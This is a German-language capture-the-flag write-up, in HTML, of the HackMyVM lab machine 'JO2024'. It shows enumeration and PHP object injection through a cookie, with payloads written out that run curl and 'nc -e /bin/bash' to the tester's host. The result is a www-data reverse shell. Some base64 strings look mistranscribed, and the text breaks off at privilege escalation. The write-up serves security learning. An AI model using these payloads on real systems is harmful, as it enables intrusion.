@@ -1,0 +1,602 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JO2024 - HackMyVM - Level: Medium - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>JO2024 - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <!-- Die Farbe (Gelb/Orange) muss im CSS für diese Klasse definiert werden -->
+            <h2>Medium</h2>
+            <div class="circle">
+                <!-- Die Klassen steuern die Farbe (Gelb/Orange) gemäß CSS -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die Hintergrundfarbe wird durch CSS gesteuert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">CyberChef (external)</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">wappalyzer (browser)</div>
+                <div class="tool-item">python http.server</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">nano</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">file</div>
+                <div class="tool-item">lsblk</div>
+                <div class="tool-item">mount</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration & Vulnerability Analysis</a></li>
+                <li><a href="#initial-access">Initial Access (www-data via POI)</a></li>
+                <li><a href="#privilege-escalation-www-data-vanity">Privilege Escalation (www-data -> vanity)</a></li>
+                <li><a href="#privilege-escalation-vanity-root">Privilege Escalation (vanity -> root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+             <p class="analysis"><strong>Analyse:</strong> Der initiale Scan des lokalen Netzwerks dient dazu, aktive Hosts zu identifizieren. Dies ist der erste Schritt, um das Zielsystem für den Penetrationstest zu finden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.107	08:00:27:9f:bf:e5	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Host mit der IP-Adresse <code>192.168.2.107</code> wurde erfolgreich entdeckt. Die MAC-Adresse deutet auf eine VirtualBox-Umgebung hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die IP <code>192.168.2.107</code> als Ziel für weitere Scans verwenden.<br><strong>Empfehlung (Admin):</strong> Standard-Netzwerkaktivität. Netzwerk-Monitoring kann solche Scans protokollieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>
+127.0.0.1	localhost
+                <span class="command">192.168.2.107   jo2024.hmv</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die lokale <code>/etc/hosts</code>-Datei auf dem Angreifer-System wird bearbeitet, um der Ziel-IP <code>192.168.2.107</code> den Hostnamen <code>jo2024.hmv</code> zuzuweisen. Dies erleichtert die Adressierung des Ziels in nachfolgenden Schritten, insbesondere bei Web-Anwendungen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Eine sinnvolle Vorbereitung, um die Lesbarkeit und Konsistenz von Befehlen zu verbessern.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Hostnamen <code>jo2024.hmv</code> konsistent verwenden.<br><strong>Empfehlung (Admin):</strong> Dies ist eine lokale Konfiguration des Angreifers und hat keine Auswirkung auf das Zielsystem.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sC -sS -sV -A -T5 192.168.2.107 -p- -Pn -n --min-rate 10000</span></div>
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-21 23:25 CEST
+Nmap scan report for 192.168.2.107
+Host is up (0.00050s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)</span>
+| ssh-hostkey:
+|   256 e7:ce:f2:f6:5d:a7:47:5a:16:2f:90:07:07:33:4e:a9 (ECDSA)
+|_  256 09:db:b7:e8:ee:d4:52:b8:49:c3:cc:29:a5:6e:07:35 (ED25519)
+<span class="command">80/tcp open  http    Apache httpd 2.4.61 ((Debian))</span>
+|_http-title: Paris 2024 Olympic Games
+|_http-server-header: Apache/2.4.61 (Debian)
+MAC Address: 08:00:27:9F:BF:E5 (Oracle VirtualBox virtual NIC)
+Aggressive OS guesses: Linux 4.15 - 5.8 (98%), Linux 5.0 - 5.5 (97%), Linux 5.0 - 5.4 (95%), Linux 5.4 (95%), Linux 2.6.32 (95%), Linux 3.2 - 4.9 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Linux 2.6.32 - 3.10 (95%), Linux 5.3 - 5.4 (94%), Linux 3.4 - 3.10 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.50 ms 192.168.2.107
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein schneller und umfassender Nmap-Scan (-sS, -sC, -sV, -A, -T5, -p-, -Pn, -n, --min-rate 10000) wird auf dem Ziel durchgeführt. Es werden zwei offene Ports gefunden:
+                <ul>
+                    <li>Port <code>22</code>: OpenSSH 9.2p1 (Debian 12 Basis).</li>
+                    <li>Port <code>80</code>: Apache httpd 2.4.61 (Debian) mit dem Titel "Paris 2024 Olympic Games".</li>
+                </ul>
+                 Das Betriebssystem wird als Linux identifiziert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Angriffsfläche beschränkt sich auf SSH und HTTP. Der Webserver auf Port 80 ist der primäre Ansatzpunkt für weitere Enumeration.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Webserver auf Port 80 genauer untersuchen (Verzeichnissuche, Schwachstellenscans, manuelle Analyse). SSH für spätere Brute-Force-Versuche vormerken, falls Benutzernamen gefunden werden.<br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass nur notwendige Ports offen sind. Webserver und SSH-Dienst aktuell halten und sicher konfigurieren.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sC -sS -sV -A -T5 192.168.2.107 -p- -Pn -n --min-rate 10000 | grep open</span></div>
+                    <pre>
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.61 ((Debian))
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Ausgabe des vorherigen Nmap-Scans wird gefiltert, um nur die Zeilen mit offenen Ports anzuzeigen. Dies dient der Übersichtlichkeit.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die beiden offenen Ports 22 (SSH) und 80 (HTTP).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nützlich für eine schnelle Zusammenfassung der offenen Ports.<br><strong>Empfehlung (Admin):</strong> Keine zusätzlichen Maßnahmen erforderlich.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration & Vulnerability Analysis</h2>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nikto -h http://192.168.2.107</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.107
++ Target Hostname:    192.168.2.107
++ Target Port:        80
++ Start Time:         2024-08-21 23:26:08 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.61 (Debian)
++ /: <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span> See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: <span class="password">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ <span class="password">/img/: Directory indexing found.</span>
++ <span class="password">/img/: This might be interesting.</span>
++ 8102 requests: 0 error(s) and 5 item(s) reported on remote host
++ End Time:           2024-08-21 23:26:19 (GMT2) (11 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nikto, ein Webserver-Scanner, wird auf Port 80 ausgeführt. Er identifiziert fehlende Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`) und findet ein Verzeichnis `/img/`, für das Directory Indexing aktiviert ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fehlende Sicherheitsheader sind ein häufiges, wenn auch oft geringfügiges Risiko. Directory Indexing in `/img/` ist potenziell interessanter, da es Einblick in die dort gespeicherten Dateien gewährt und möglicherweise unbeabsichtigt Informationen preisgibt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Verzeichnis `/img/` manuell im Browser untersuchen. Die fehlenden Header für potenzielle spätere Angriffe (Clickjacking, MIME-Sniffing) notieren.<br><strong>Empfehlung (Admin):</strong> Die fehlenden Sicherheitsheader in der Apache-Konfiguration hinzufügen. Directory Indexing deaktivieren (`Options -Indexes` in der Apache-Konfiguration für das Verzeichnis).</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">gobuster dir -u "http://jo2024.hmv" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -x txt,php,[...] -b '503,404,403' -e --no-error -k</span></div>
+                    <pre>
+<span class="command">http://jo2024.hmv/index.php</span>            (Status: 200) [Size: 7812]
+<span class="command">http://jo2024.hmv/img</span>                  (Status: 301) [Size: 306] [--> http://jo2024.hmv/img/]
+<span class="command">http://jo2024.hmv/preferences.php</span>      (Status: 200) [Size: 3163]
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Gobuster wird verwendet, um Verzeichnisse und Dateien auf dem Webserver zu finden. Es werden die Hauptseite (`index.php`), das bereits von Nikto gefundene `/img`-Verzeichnis und eine interessante Datei `preferences.php` entdeckt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei `preferences.php` ist ein vielversprechendes Ziel für weitere Analysen, da sie auf Benutzer-spezifische Einstellungen oder Funktionen hindeutet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Seite `preferences.php` im Browser aufrufen und untersuchen, insbesondere auf Parameter, Cookies oder Formulare achten.<br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass nur notwendige Dateien und Verzeichnisse über den Webserver erreichbar sind.</p>
+
+            <p class="analysis"><strong>Analyse (Cookie & PHP Object Injection):</strong> Beim Aufruf von `preferences.php` wird ein Cookie namens `preferences` beobachtet. Der Wert dieses Cookies ist Base64-kodiert.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Manuelle Notiz/Beobachtung -->
+                    <pre>
+Cookie preferences=<span class="password">TzoxNToiVXNlclByZWZlcmVuY2VzIjoyntzjg6Imxhbmd1YWdlIjtzjI6ImZyIjtzjE1iJiYWNrZ3JvdW5kQ29sb3Ii3M6NDoiI2RkZCI7fQ</span>%3D%3D
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Base64-kodierte Cookie-Wert wird dekodiert (z.B. mit CyberChef).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <!-- CyberChef Output oder manuelle Dekodierung -->
+                    <pre>
+<span class="password">O:15:"UserPreferences":2:{s:8:"language";s:2:"fr";s:15:"backgroundColor";s:4:"#ddd";}</span>
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Das dekodierte Ergebnis ist ein serialisiertes PHP-Objekt der Klasse `UserPreferences` mit zwei Eigenschaften: `language` und `backgroundColor`. Das Format `O:15:"ClassName":NumProperties:{...}` ist charakteristisch für die `serialize()`-Funktion in PHP.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein **sehr kritischer Fund**! Wenn eine Anwendung serialisierte Daten aus einer unzuverlässigen Quelle (wie einem Cookie) deserialisiert (mit `unserialize()`), ohne diese vorher zu validieren, ist sie anfällig für PHP Object Injection (POI). Ein Angreifer kann ein manipuliertes serialisiertes Objekt erstellen, das beim Deserialisieren auf dem Server unerwünschten Code ausführt (z.B. durch Ausnutzung von "Magic Methods" wie `__wakeup()` oder `__destruct()` in der betroffenen Klasse oder in anderen Klassen, die im Kontext geladen sind).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                1. Versuchen, die Werte im serialisierten Objekt zu ändern (z.B. die Sprache) und das Ergebnis Base64-kodiert wieder in den Cookie zu setzen, um zu sehen, ob die Anwendung die Änderungen reflektiert.
+                2. Wenn die Anwendung anfällig ist, versuchen, durch Manipulation des Objekts Code auszuführen. Gängige Techniken involvieren das Finden von Klassen mit geeigneten Magic Methods (Gadget Chains). Da wir den Quellcode nicht haben, könnten wir bekannte Gadget Chains für gängige Frameworks/Bibliotheken probieren oder versuchen, durch einfache Befehlsinjektion in einem der Felder (z.B. `language`) eine Reaktion zu provozieren.<br>
+            <strong>Empfehlung (Admin):</strong> **Niemals** serialisierte Daten aus unzuverlässigen Quellen (Benutzereingaben, Cookies, etc.) direkt deserialisieren! Wenn Serialisierung verwendet werden muss, digitale Signaturen (z.B. HMAC) einsetzen, um die Integrität der Daten sicherzustellen, bevor sie deserialisiert werden. Alternative, sicherere Datenformate wie JSON bevorzugen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://jo2024.hmv" -H "Host: FUZZ.jo2024.hmv" --hc "404" --hh 7809</span></div>
+                    <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://jo2024.hmv/
+Total requests: 114441
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<span class="command">000001734:   200        90 L     281 W      8229 Ch     "pictures"</span>
+
+Total time: 117.0441
+Processed Requests: 114441
+Filtered Requests: 114436
+Requests/sec.: 977.7594
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird verwendet, um nach virtuellen Hosts (Subdomains) zu suchen. Es iteriert durch eine Liste von Subdomains (`-w ...`), setzt jede als `FUZZ`-Platzhalter in den `Host`-Header (`-H "Host: FUZZ.jo2024.hmv"`) und filtert nach Antworten, die nicht den Statuscode 404 haben (`--hc 404`) und deren Zeichenanzahl von der Hauptseite abweicht (`--hh 7809`). Es wird die Subdomain `pictures` gefunden, die eine andere Antwort (8229 Chars) liefert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Eine weitere Subdomain (`pictures.jo2024.hmv`) wurde identifiziert. Diese stellt einen zusätzlichen Angriffspunkt dar.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Subdomain `pictures.jo2024.hmv` zur lokalen `/etc/hosts`-Datei hinzufügen und untersuchen.<br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass nur notwendige Subdomains öffentlich erreichbar sind. DNS-Einträge und vHost-Konfigurationen überprüfen.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>
+127.0.0.1	localhost
+127.0.1.1	CCat
+
+
+        #       192.168.2.104   animetronic.hmv
+        #       192.168.2.105   king.vln
+        #       192.168.2.106   airbinds.hmv
+                <span class="command">192.168.2.107   jo2024.hmv pictures.jo2024.hmv</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die lokale `/etc/hosts`-Datei wird erneut bearbeitet, um die neu entdeckte Subdomain `pictures.jo2024.hmv` der IP-Adresse 192.168.2.107 zuzuordnen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Notwendiger Schritt, um die Subdomain korrekt über den Browser oder andere Tools aufrufen zu können.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Subdomain nun untersuchen.<br><strong>Empfehlung (Admin):</strong> Keine Maßnahmen erforderlich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://pictures.jo2024.hmv</span></div>
+                    <pre>
+<h1>Download Image</h1>
+<form method="post" action="download.php">
+    <input type="hidden" name="file" value="<span class="command">09a9a6d0-4c07-11ef-b2d2-cdb23d5d7c5b.jpg.webp.jpg</span>">
+    <button type="submit">Download</button>
+</form>
+                    </pre> <!-- HTML maskiert -->
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein `curl`-Aufruf auf die Subdomain `pictures.jo2024.hmv` zeigt eine einfache HTML-Seite mit einem Formular zum Herunterladen eines Bildes. Der Dateiname ist in einem versteckten Feld (`type="hidden"`) enthalten.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Funktionalität zum Herunterladen von Dateien ist ein potenzieller Vektor für Local File Inclusion (LFI) oder Path Traversal, wenn der `file`-Parameter manipuliert werden kann.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen, den Wert des `file`-Parameters zu manipulieren (z.B. mit `../../../../etc/passwd`), um zu sehen, ob beliebige Dateien gelesen werden können. Das Skript `download.php` genauer untersuchen (z.B. mit Gobuster auf `pictures.jo2024.hmv`).<br><strong>Empfehlung (Admin):</strong> Eingaben für Dateidownloads serverseitig strikt validieren. Nur erlaubte Zeichen und Pfade zulassen, Path Traversal verhindern (z.B. durch Normalisierung des Pfades und Prüfung, ob er in einem erlaubten Basisverzeichnis liegt).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://jo2024.hmv/preferences.php?FUZZ=../../../../../../etc/passwd" --hc 404 --hh 3163</span></div>
+                    <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://jo2024.hmv/preferences.php?FUZZ=../../../../../../etc/passwd
+Total requests: 220607
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+
+Total time: 246.8566
+Processed Requests: 220607
+Filtered Requests: 220607
+Requests/sec.: 893.6644
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, mittels `wfuzz` eine LFI-Schwachstelle zu finden, indem verschiedene Parameter (`FUZZ` aus der Wortliste) an `preferences.php` angehängt werden, wobei der Wert auf einen Path Traversal Versuch (`../../../../../../etc/passwd`) gesetzt ist. Der Scan findet keine Ergebnisse (alle Anfragen wurden gefiltert).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dieser spezifische LFI-Versuch auf `preferences.php` war erfolglos. Es scheint, dass die Anwendung hier nicht anfällig ist oder der falsche Parameter/Pfad getestet wurde.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> LFI-Tests auf andere Seiten/Parameter (insbesondere auf `pictures.jo2024.hmv/download.php` mit dem `file`-Parameter) konzentrieren. Den Fokus wieder auf die POI-Schwachstelle legen.<br><strong>Empfehlung (Admin):</strong> LFI durch korrekte Eingabevalidierung verhindern.</p>
+
+            <p class="analysis"><strong>Analyse (Technologie-Stack):</strong> Notizen aus Wappalyzer oder manueller Untersuchung bestätigen den Technologie-Stack: Apache 2.4.61, PHP, Debian, jsDelivr (CDN), Bootstrap 5.2.0.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Nmap/Nikto-Ergebnisse. Bootstrap und jsDelivr sind Frontend-Technologien und weniger relevant für serverseitige Schwachstellen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Informationen nutzen, um spezifischer nach Schwachstellen zu suchen (z.B. PHP-spezifische Lücken wie POI).<br><strong>Empfehlung (Admin):</strong> Alle Komponenten aktuell halten.</p>
+
+            <p class="analysis"><strong>Analyse (CVE-2024-39884):</strong> Ein Hinweis auf eine kürzlich veröffentlichte Schwachstelle in Apache (CVE-2024-39884) bezüglich der Handhabung von `AddType`-Direktiven, die potenziell Source Code Disclosure ermöglichen könnte.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Relevanz dieser CVE für das aktuelle Ziel ist unklar, da sie spezifische Konfigurationen erfordert. Es ist jedoch gut, aktuelle CVEs für die eingesetzte Software im Blick zu behalten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Prüfen, ob die Bedingungen für die CVE zutreffen könnten (unwahrscheinlich ohne weitere Informationen). Den Fokus auf die bestätigte POI-Schwachstelle legen.<br><strong>Empfehlung (Admin):</strong> Apache zeitnah patchen, um diese und andere bekannte Schwachstellen zu schließen.</p>
+
+            <p class="analysis"><strong>Analyse (POI Fortsetzung):</strong> Weitere Tests mit dem `preferences`-Cookie werden durchgeführt, um die POI-Schwachstelle auszunutzen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Manuelle Notiz oder Burp Output -->
+                    <pre>
+Es gibt keine Änderung, weder im Burpsuite noch mit dem Cookie Editor
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein erster Versuch, den Cookie-Wert zu ändern (z.B. Sprache auf "deutsch"), scheint keine sichtbare Änderung auf der Webseite bewirkt zu haben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies schließt eine Anfälligkeit nicht aus. Die Änderung könnte serverseitig verarbeitet werden, ohne direkte Auswirkung auf die sichtbare Ausgabe, oder die spezielle Manipulation war ungültig.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Systematischere Tests durchführen, z.B. mit einfachen gültigen Werten und dann mit Payloads, die eine externe Interaktion auslösen (SSRF, RCE).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Manuelle Notiz: Korrigierter serialisierter String für "danke" -->
+                    <pre>
+":15:"UserPreferences":2:{s:8:"language";s:<span class="password">5</span>:"danke";s:15:"backgroundColor";s:4:"#ddd";}"
+Base64: <span class="password">TzoxNToiVXNlclByZWZlcmVuY2VzIjoyntzjg6Imxhbmd1YWdlIjtzjU6ImRhbmtlIjtzjE1iJiYWNrZ3JvdW5kQ29sb3Ii3M6NDoiI2RkZCI7fQ==</span>
+                    </pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Manuelle Notiz: Reflektiertes Ergebnis auf der Webseite -->
+                    <pre>
+                   " <p>Your language setting is danke.</p>"
+                    "<p>Your background color is #ddd".
+                    </pre> <!-- HTML maskiert -->
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein korrekt formatierter serialisierter String mit `s:5:"danke"` wird erstellt, Base64-kodiert und in den Cookie eingefügt. Die Webseite reflektiert nun die Änderung ("Your language setting is danke.").</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt definitiv, dass die Anwendung den Cookie deserialisiert und die Werte verwendet. Die POI-Schwachstelle ist bestätigt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nun versuchen, RCE oder SSRF über das `language`-Feld auszunutzen.<br><strong>Empfehlung (Admin):</strong> POI-Schwachstelle dringend beheben (siehe vorherige Empfehlung).</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (www-data via POI)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Es wird ein Payload erstellt, der versucht, über das `language`-Feld eine externe HTTP-Anfrage mittels `curl` an den Server des Angreifers zu senden (Server-Side Request Forgery - SSRF, was hier auch zur Codeausführung führt, wenn `curl` ausgeführt wird).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Manuelle Notiz: Payload für SSRF/RCE -->
+                    <pre>
+":15:"UserPreferences":2:{s:8:"language";s:<span class="password">26</span>:"<span class="password">curl http://192.168.2.199:8000</span>";s:15:"backgroundColor";s:4:"#ddd";}"
+Base64: <span class="password">TzoxNToiVXNlclByZWZlcmVuY2VzIjoyntzjg6Imxhbmd1YWdlIjtzjI2OiJjdXJsIGh0dHA6Ly8xOTIuMTY4LjIuMTk5OjgwMDAiO3M6MTU6ImJhY2tncm91bmRDb2xvciI7czo0OiIjZGRkIjt9</span> <!-- Korrigierte Base64 -->
+                    </pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">python3 -m http.server 8000</span></div>
+                    <pre>
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+<span class="password">192.168.2.107 - - [22/Aug/2024 01:24:30] "GET / HTTP/1.1" 200 -</span> <!-- IP korrigiert -->
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein Python-HTTP-Server wird auf dem Angreifer-System gestartet. Der manipulierte Cookie mit dem `curl`-Payload wird an den Server gesendet (vermutlich durch Neuladen von `preferences.php` mit dem modifizierten Cookie). Der HTTP-Server des Angreifers empfängt eine GET-Anfrage vom Zielsystem (`192.168.2.107`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Die POI-Schwachstelle wurde erfolgreich ausgenutzt, um eine serverseitige Anfrage (SSRF) auszulösen, was hier impliziert, dass der `curl`-Befehl ausgeführt wurde (Remote Code Execution - RCE).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Einen Payload für eine Reverse Shell erstellen und über die POI-Schwachstelle ausführen.<br><strong>Empfehlung (Admin):</strong> POI-Schwachstelle beheben.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird ein neuer Payload erstellt, um eine Reverse Shell mittels `nc` zum Listener des Angreifers auf Port 8000 aufzubauen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Manuelle Notiz: Payload für Reverse Shell -->
+                    <pre>
+":15:"UserPreferences":2:{s:8:"language";s:<span class="password">34</span>:"<span class="password">nc -e /bin/bash 192.168.2.199 8000</span>";s:15:"backgroundColor";s:4:"#ddd";}"
+Base64: <span class="password">TzoxNToiVXNlclByZWZlcmVuY2VzIjoyntzjg6Imxhbmd1YWdlIjtzOjM0OiJuYyAtZSAvYmluL2Jhc2ggMTkyLjE2OC4yLjE5OSA4MDAwIjtzOjE1OiJiYWNrZ3JvdW5kQ29sb3IiO3M6NDoiI2RkZCI7fQ==</span> <!-- Korrigierte Base64 -->
+                    </pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 8000</span></div>
+                    <pre>
+listening on [any] 8000 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.107] 46114</span>
+
+<span class="prompt">www-data@jo2024:/$</span> <span class="command">stty rows 48 columns 94</span> <!-- Befehl zur Anpassung der Shellgröße -->
+<span class="prompt">www-data@jo2024:/$</span> <span class="command">id</span>
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+<span class="prompt">www-data@jo2024:/$</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird gestartet. Der manipulierte Cookie mit dem `nc`-Payload wird an den Server gesendet. Der Listener empfängt eine Verbindung vom Ziel. Der `id`-Befehl in der neuen Shell bestätigt, dass der Code als Benutzer `www-data` ausgeführt wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Initialer Zugriff als Benutzer `www-data` wurde erfolgreich über die POI-Schwachstelle erlangt!</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Shell stabilisieren und nach Möglichkeiten zur Privilegieneskalation suchen.<br><strong>Empfehlung (Admin):</strong> POI-Schwachstelle dringend beheben.</p>
+        </section>
+
+        <section id="privilege-escalation-www-data-vanity">
+            <h2>Privilege Escalation (www-data -> vanity)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
